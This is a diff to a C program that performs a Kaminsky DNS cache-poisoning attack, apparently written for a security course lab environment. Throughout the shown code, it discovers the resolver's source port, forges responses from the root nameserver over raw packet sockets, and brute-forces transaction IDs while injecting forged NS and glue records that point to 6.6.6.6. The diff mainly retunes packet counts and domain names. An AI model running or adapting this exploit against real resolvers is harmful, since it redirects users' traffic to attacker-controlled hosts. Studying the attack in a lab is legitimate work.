@@ -43,7 +43,7 @@
 #define TCP_PORT    12345       // Port for receiving resolver port from server
 #define MAX_LEN_PORT 64
 // send at most 65536*20 spoofed packets in each attack attempt
-#define MAX_SPOOFED_PKTS   (65536 * 20)
+#define MAX_SPOOFED_PKTS   65536
 #define MAX_ROUNDS         20  // Maximum attack rounds to attempt
 
 /* raw socket for packet injection */
@@ -151,26 +151,26 @@ static int wait_for_resolver_port_over_tcp(int listen_sock)
  * calculate_checksum - Calculate Internet checksum (RFC 1071)
  * @data: Pointer to data buffer
  * @len: Length of data in bytes
- * 
+ *
  * Returns: 16-bit checksum value
  */
 static uint16_t calculate_checksum(const void *data, size_t len)
 {
     const uint16_t *buf = (const uint16_t *)data;
     uint32_t sum = 0;
-    
+
     while (len > 1) {
         sum += *buf++;
         len -= 2;
     }
-    
+
     if (len == 1) {
         sum += *(const uint8_t *)buf;
     }
-    
+
     sum = (sum >> 16) + (sum & 0xFFFF);
     sum += (sum >> 16);
-    
+
     return (uint16_t)~sum;
 }
 
@@ -180,7 +180,7 @@ static uint16_t calculate_checksum(const void *data, size_t len)
  * @dest_ip: Destination IP address (network byte order)
  * @udp_hdr: Pointer to UDP header
  * @udp_len: Total UDP length (header + data)
- * 
+ *
  * Returns: 16-bit UDP checksum
  */
 static uint16_t calculate_udp_checksum(uint32_t src_ip, uint32_t dest_ip,
@@ -193,22 +193,22 @@ static uint16_t calculate_udp_checksum(uint32_t src_ip, uint32_t dest_ip,
         uint8_t protocol;
         uint16_t udp_length;
     } pseudo_header;
-    
+
     pseudo_header.src_addr = src_ip;
     pseudo_header.dest_addr = dest_ip;
     pseudo_header.zero = 0;
     pseudo_header.protocol = IPPROTO_UDP;
     pseudo_header.udp_length = htons(udp_len);
-    
+
     uint32_t sum = 0;
     const uint16_t *buf;
-    
+
     // Add pseudo-header
     buf = (const uint16_t *)&pseudo_header;
     for (size_t i = 0; i < sizeof(pseudo_header) / 2; i++) {
         sum += buf[i];
     }
-    
+
     // Add UDP header and data
     buf = (const uint16_t *)udp_hdr;
     size_t len = udp_len;
@@ -216,14 +216,14 @@ static uint16_t calculate_udp_checksum(uint32_t src_ip, uint32_t dest_ip,
         sum += *buf++;
         len -= 2;
     }
-    
+
     if (len == 1) {
         sum += *(const uint8_t *)buf;
     }
-    
+
     sum = (sum >> 16) + (sum & 0xFFFF);
     sum += (sum >> 16);
-    
+
     return (uint16_t)~sum;
 }
 
@@ -236,22 +236,22 @@ static uint16_t calculate_udp_checksum(uint32_t src_ip, uint32_t dest_ip,
  * @ifname: Interface name (e.g., "eth0")
  * @mac: Buffer to store MAC address (6 bytes)
  * @ifindex: Pointer to store interface index
- * 
+ *
  * Returns: 0 on success, -1 on failure
  */
 static int get_interface_info(const char *ifname, unsigned char *mac, int *ifindex)
 {
     struct ifreq ifr;
     int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    
+
     if (sockfd < 0) {
         perror("socket for ioctl");
         return -1;
     }
-    
+
     memset(&ifr, 0, sizeof(ifr));
     strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
-    
+
     // Get MAC address
     if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
         perror("ioctl SIOCGIFHWADDR");
@@ -259,7 +259,7 @@ static int get_interface_info(const char *ifname, unsigned char *mac, int *ifind
         return -1;
     }
     memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
-    
+
     // Get interface index
     if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
         perror("ioctl SIOCGIFINDEX");
@@ -267,7 +267,7 @@ static int get_interface_info(const char *ifname, unsigned char *mac, int *ifind
         return -1;
     }
     *ifindex = ifr.ifr_ifindex;
-    
+
     close(sockfd);
     return 0;
 }
@@ -276,14 +276,14 @@ static int get_interface_info(const char *ifname, unsigned char *mac, int *ifind
 static int init_raw_socket(void)
 {
     int ifindex;
-    
+
     // Create raw socket
     g_raw_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
     if (g_raw_sockfd < 0) {
         perror("socket(AF_PACKET)");
         return -1;
     }
-    
+
     // Get eth0 MAC address and interface index
     if (get_interface_info("eth0", g_src_mac, &ifindex) < 0) {
         fprintf(stderr, "Failed to get eth0 interface info\n");
@@ -291,26 +291,26 @@ static int init_raw_socket(void)
         g_raw_sockfd = -1;
         return -1;
     }
-    
+
     printf("eth0 MAC: %02x:%02x:%02x:%02x:%02x:%02x (ifindex=%d)\n",
            g_src_mac[0], g_src_mac[1], g_src_mac[2],
            g_src_mac[3], g_src_mac[4], g_src_mac[5], ifindex);
-    
+
     // Set source MAC to root NS (for spoofing packets from root server)
     memcpy(g_src_mac, ROOT_NS_MAC, 6);
     printf("Spoofing as root NS MAC: 02:42:ac:11:00:04\n");
-    
+
     // Set destination MAC to resolver
     memcpy(g_dest_mac, RESOLVER_MAC, 6);
     printf("Sending to resolver MAC: 02:42:ac:11:00:03\n");
-    
+
     // Setup sockaddr_ll for sendto
     memset(&g_dest_addr, 0, sizeof(g_dest_addr));
     g_dest_addr.sll_family = AF_PACKET;
     g_dest_addr.sll_ifindex = ifindex;
     g_dest_addr.sll_halen = ETH_ALEN;
     memcpy(g_dest_addr.sll_addr, g_dest_mac, 6);
-    
+
     printf("Raw socket initialized on eth0\n");
     return 0;
 }
@@ -329,25 +329,25 @@ static void cleanup_raw_socket(void)
  * @round: Round number to incorporate into subdomain
  * @buf: Output buffer for the subdomain string
  * @buf_len: Size of output buffer
- * 
+ *
  * Creates subdomains like: www.example0.cybercourse.example.com,
  * www.example1.cybercourse.example.com, etc.
- * 
+ *
  * Each round needs a unique subdomain to avoid cache hits from previous
  * rounds, giving us a fresh attack window.
  */
 static void build_unique_subdomain(int round, char *buf, size_t buf_len)
 {
-    snprintf(buf, buf_len, "www.example%d.cybercourse.example.com", round);
+    snprintf(buf, buf_len, "ww%d.example1.cybercourse.example.com", round);
 }
 
 /**
  * send_dns_query_to_resolver - Send DNS query to recursive resolver
  * @qname: Fully qualified domain name to query
- * 
+ *
  * Sends a UDP DNS query to the resolver which will trigger it to query
  * upstream authoritative servers.
- * 
+ *
  * Returns: 0 on success, -1 on failure
  */
 static int send_dns_query_to_resolver(const char *qname)
@@ -359,14 +359,14 @@ static int send_dns_query_to_resolver(const char *qname)
     size_t wire_len = 0;
     ldns_status status;
     int ret = -1;
-    
+
     // Create UDP socket
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if (sockfd < 0) {
         perror("socket (UDP)");
         return -1;
     }
-    
+
     // Build DNS query
     query = ldns_pkt_query_new(
         ldns_dname_new_frm_str(qname),
@@ -374,13 +374,13 @@ static int send_dns_query_to_resolver(const char *qname)
         LDNS_RR_CLASS_IN,
         LDNS_RD  // Recursion desired
     );
-    
+
     if (!query) {
         fprintf(stderr, "Failed to create DNS query for %s\n", qname);
         close(sockfd);
         return -1;
     }
-    
+
     // Serialize to wire format
     status = ldns_pkt2wire(&wire_data, query, &wire_len);
     if (status != LDNS_STATUS_OK) {
@@ -390,7 +390,7 @@ static int send_dns_query_to_resolver(const char *qname)
         close(sockfd);
         return -1;
     }
-    
+
     // Setup resolver address
     memset(&resolver_addr, 0, sizeof(resolver_addr));
     resolver_addr.sin_family = AF_INET;
@@ -399,20 +399,20 @@ static int send_dns_query_to_resolver(const char *qname)
         perror("inet_pton");
         goto cleanup;
     }
-    
+
     // Send query to resolver
     ssize_t sent = sendto(sockfd, wire_data, wire_len, 0,
                           (struct sockaddr *)&resolver_addr,
                           sizeof(resolver_addr));
-    
+
     if (sent < 0) {
         perror("sendto (resolver)");
         goto cleanup;
     }
-    
+
     printf("Sent DNS query for %s to resolver %s\n", qname, RESOLVER_IP);
     ret = 0;
-    
+
 cleanup:
     if (wire_data) free(wire_data);
     if (query) ldns_pkt_free(query);
@@ -422,14 +422,14 @@ cleanup:
 
 /**
  * learn_resolver_source_port - Discover the source port used by resolver
- * 
+ *
  * Sends a DNS query to the resolver for www.attacker.cybercourse.example.com.
  * The resolver will forward the query to our attacker's authoritative server,
  * which captures the source port and sends it back to us over TCP.
- * 
+ *
  * This is critical for the Kaminsky attack as we need to spoof responses
  * with the correct destination port.
- * 
+ *
  * Returns: 0 on success, -1 on failure
  */
 static int learn_resolver_source_port(void)
@@ -437,16 +437,16 @@ static int learn_resolver_source_port(void)
     const char *trigger_domain = "www.attacker.cybercourse.example.com";
     int listen_sock;
     int port;
-    
+
     printf("\n=== Learning Resolver Source Port ===\n");
-    
+
     // Setup TCP listener to receive port from our auth server
     listen_sock = setup_tcp_listener();
     if (listen_sock < 0) {
         fprintf(stderr, "Failed to setup TCP listener\n");
         return -1;
     }
-    
+
     // Send DNS query to resolver for our attacker domain
     printf("Sending trigger query to resolver...\n");
     if (send_dns_query_to_resolver(trigger_domain) < 0) {
@@ -454,21 +454,21 @@ static int learn_resolver_source_port(void)
         close(listen_sock);
         return -1;
     }
-    
+
     // Wait for our auth server to send us the port over TCP
     printf("Waiting for auth server to report resolver source port...\n");
     port = wait_for_resolver_port_over_tcp(listen_sock);
     close(listen_sock);
-    
+
     if (port < 0 || port > 65535) {
         fprintf(stderr, "Invalid port received: %d\n", port);
         return -1;
     }
-    
+
     g_resolver_src_port = (uint16_t)port;
     printf("\n✓ Resolver source port learned: %u\n", g_resolver_src_port);
     printf("=====================================\n\n");
-    
+
     return 0;
 }
 
@@ -478,14 +478,14 @@ static int learn_resolver_source_port(void)
  * @txid_guess: Guessed transaction ID to match resolver's query
  * @out_buf: Output buffer for serialized DNS packet (caller must free)
  * @out_len: Output length of serialized packet
- * 
+ *
  * Builds a DNS response that includes:
  * - Answer section: A record for the queried domain
  * - Authority section: NS record claiming cybercourse.example.com delegates to attacker
  * - Additional section: A record mapping attacker's NS to malicious IP (6.6.6.6)
- * 
+ *
  * This is the core Kaminsky payload that poisons the cache.
- * 
+ *
  * Returns: 0 on success, -1 on failure
  */
 static int build_spoofed_response(const char *qname,
@@ -499,14 +499,14 @@ static int build_spoofed_response(const char *qname,
     ldns_rr *additional_rr = NULL;
     ldns_status status;
     int ret = -1;
-    
+
     // Create new DNS packet
     response = ldns_pkt_new();
     if (!response) {
         fprintf(stderr, "Failed to create DNS packet\n");
         return -1;
     }
-    
+
     // Set DNS header fields
     ldns_pkt_set_id(response, txid_guess);
     ldns_pkt_set_qr(response, 1);              // QR=1 (response)
@@ -515,21 +515,21 @@ static int build_spoofed_response(const char *qname,
     ldns_pkt_set_ra(response, 1);              // RA=1 (recursion available)
     ldns_pkt_set_opcode(response, LDNS_PACKET_QUERY);
     ldns_pkt_set_rcode(response, LDNS_RCODE_NOERROR);
-    
+
     // Add question section (copy from original query)
     ldns_rdf *qname_rdf = ldns_dname_new_frm_str(qname);
     if (!qname_rdf) {
         fprintf(stderr, "Failed to create domain name\n");
         goto cleanup;
     }
-    
+
     ldns_rr *question = ldns_rr_new();
     ldns_rr_set_owner(question, qname_rdf);
     ldns_rr_set_type(question, LDNS_RR_TYPE_A);
     ldns_rr_set_class(question, LDNS_RR_CLASS_IN);
     ldns_pkt_push_rr(response, LDNS_SECTION_QUESTION, question);
     ldns_pkt_set_qdcount(response, 1);
-    
+
     // Answer section: A record for the queried domain
     answer_rr = ldns_rr_new();
     ldns_rr_set_owner(answer_rr, ldns_dname_new_frm_str(qname));
@@ -538,27 +538,27 @@ static int build_spoofed_response(const char *qname,
     ldns_rr_set_ttl(answer_rr, 86400); // 24 hours TTL
     ldns_rr_push_rdf(answer_rr, ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, "1.2.3.4"));
     ldns_pkt_push_rr(response, LDNS_SECTION_ANSWER, answer_rr);
-    
+
     // Authority section: NS record for parent domain (Kaminsky payload)
     // This is the critical part - claim cybercourse.example.com delegates to attacker
     authority_rr = ldns_rr_new();
-    ldns_rr_set_owner(authority_rr, ldns_dname_new_frm_str("cybercourse.example.com"));
+    ldns_rr_set_owner(authority_rr, ldns_dname_new_frm_str("example1.cybercourse.example.com"));
     ldns_rr_set_type(authority_rr, LDNS_RR_TYPE_NS);
     ldns_rr_set_class(authority_rr, LDNS_RR_CLASS_IN);
     ldns_rr_set_ttl(authority_rr, 86400);
-    ldns_rr_push_rdf(authority_rr, ldns_dname_new_frm_str("ns.attacker.com"));
+    ldns_rr_push_rdf(authority_rr, ldns_dname_new_frm_str("ns.example1.cybercourse.example.com"));
     ldns_pkt_push_rr(response, LDNS_SECTION_AUTHORITY, authority_rr);
-    
+
     // Additional section: A record for attacker's nameserver (glue record)
     // This is what actually poisons the cache with the malicious IP
     additional_rr = ldns_rr_new();
-    ldns_rr_set_owner(additional_rr, ldns_dname_new_frm_str("ns.attacker.com"));
+    ldns_rr_set_owner(additional_rr, ldns_dname_new_frm_str("ns.example1.cybercourse.example.com"));
     ldns_rr_set_type(additional_rr, LDNS_RR_TYPE_A);
     ldns_rr_set_class(additional_rr, LDNS_RR_CLASS_IN);
     ldns_rr_set_ttl(additional_rr, 86400);
     ldns_rr_push_rdf(additional_rr, ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, "6.6.6.6"));
     ldns_pkt_push_rr(response, LDNS_SECTION_ADDITIONAL, additional_rr);
-    
+
     // Serialize to wire format
     status = ldns_pkt2wire(out_buf, response, out_len);
     if (status != LDNS_STATUS_OK) {
@@ -566,9 +566,9 @@ static int build_spoofed_response(const char *qname,
                 ldns_get_errorstr_by_id(status));
         goto cleanup;
     }
-    
+
     ret = 0;
-    
+
 cleanup:
     if (response) {
         ldns_pkt_free(response);
@@ -585,39 +585,39 @@ static int inject_spoofed_packet(const uint8_t *dns_data, size_t dns_len)
     struct udphdr *udp;
     uint8_t *dns_payload;
     size_t total_len;
-    
+
     uint32_t src_ip, dest_ip;
-    
+
     // Convert IPs to network byte order
     inet_pton(AF_INET, ROOT_NS_IP, &src_ip);
     inet_pton(AF_INET, RESOLVER_IP, &dest_ip);
-    
+
     // Calculate sizes
     size_t eth_len = sizeof(struct ether_header);
     size_t ip_len = sizeof(struct iphdr);
     size_t udp_len = sizeof(struct udphdr);
     total_len = eth_len + ip_len + udp_len + dns_len;
-    
+
     if (total_len > MAX_BYTES_PER_PACKET) {
         fprintf(stderr, "Packet too large: %zu bytes\n", total_len);
         return -1;
     }
-    
+
     memset(packet, 0, total_len);
-    
+
     // === Build Ethernet Header ===
     eth = (struct ether_header *)packet;
     memcpy(eth->ether_dhost, g_dest_mac, 6);
     memcpy(eth->ether_shost, g_src_mac, 6);
     eth->ether_type = htons(ETHERTYPE_IP);
-    
+
     // === Build IP Header ===
     ip = (struct iphdr *)(packet + eth_len);
     ip->version = 4;
     ip->ihl = 5;  // 5 * 4 = 20 bytes (no options)
     ip->tos = 0;
-    ip->tot_len = htons((uint16_t)(ip_len + udp_len + dns_len));
-    ip->id = htons((uint16_t)(rand() % 65536));
+    ip->tot_len = htons(ip_len + udp_len + dns_len);
+    ip->id = htons(rand() % 65536);
     ip->frag_off = 0;
     ip->ttl = 64;
     ip->protocol = IPPROTO_UDP;
@@ -625,30 +625,30 @@ static int inject_spoofed_packet(const uint8_t *dns_data, size_t dns_len)
     ip->daddr = dest_ip;
     ip->check = 0;  // Will calculate below
     ip->check = calculate_checksum(ip, ip_len);
-    
+
     // === Build UDP Header ===
     udp = (struct udphdr *)(packet + eth_len + ip_len);
     udp->source = htons(DNS_PORT);
     udp->dest = htons(g_resolver_src_port);
-    udp->len = htons((uint16_t)(udp_len + dns_len));
+    udp->len = htons(udp_len + dns_len);
     udp->check = 0;  // Will calculate below
-    
+
     // === Copy DNS payload ===
     dns_payload = packet + eth_len + ip_len + udp_len;
     memcpy(dns_payload, dns_data, dns_len);
-    
+
     // === Calculate UDP checksum ===
-    udp->check = calculate_udp_checksum(src_ip, dest_ip, udp, (uint16_t)(udp_len + dns_len));
-    
+    udp->check = calculate_udp_checksum(src_ip, dest_ip, udp, udp_len + dns_len);
+
     // === Send packet ===
     ssize_t sent = sendto(g_raw_sockfd, packet, total_len, 0,
                           (struct sockaddr *)&g_dest_addr, sizeof(g_dest_addr));
-    
+
     if (sent < 0) {
         perror("sendto");
         return -1;
     }
-    
+
     return 0;
 }
 
@@ -667,41 +667,41 @@ static void perform_attack_round(int round)
     (void)send_dns_query_to_resolver(subdomain);
 
     /* Step 2: flood with spoofed answers trying different TXIDs */
-    printf("[Round %d] Flooding with up to %d spoofed responses...\n", 
+    printf("[Round %d] Flooding with up to %d spoofed responses...\n",
            round, MAX_SPOOFED_PKTS);
-    
+
     uint8_t *spoofed_dns = NULL;
     size_t spoofed_len = 0;
     int successful_injections = 0;
-    
+
     for (uint32_t i = 0; i < MAX_SPOOFED_PKTS; i++) {
         // Try different TXID values across the 16-bit space
         // We cycle through all possible values multiple times
         uint16_t txid_guess = (uint16_t)(i & 0xFFFF);
-        
+
         // Build spoofed DNS response with guessed TXID
-        if (build_spoofed_response(subdomain, txid_guess, 
+        if (build_spoofed_response(subdomain, txid_guess,
                                    &spoofed_dns, &spoofed_len) < 0) {
             continue; // Skip this TXID on error
         }
-        
+
         // Inject the spoofed packet via raw socket
         if (inject_spoofed_packet(spoofed_dns, spoofed_len) == 0) {
             successful_injections++;
         }
-        
+
         // Free the allocated DNS buffer
         if (spoofed_dns) {
             free(spoofed_dns);
             spoofed_dns = NULL;
         }
-        
+
         // Optional: Print progress every 10000 packets
         if ((i + 1) % 10000 == 0) {
             printf("  Sent %u/%d packets...\n", i + 1, MAX_SPOOFED_PKTS);
         }
     }
-    
+
     printf("[Round %d] Injection complete: %d/%d packets sent successfully\n",
            round, successful_injections, MAX_SPOOFED_PKTS);
 }
@@ -755,7 +755,7 @@ int main(void)
             break;
         }
     }
-    
+
     if (ret != 0) {
         printf("\n✗ Attack failed after %d rounds.\n", MAX_ROUNDS);
     }
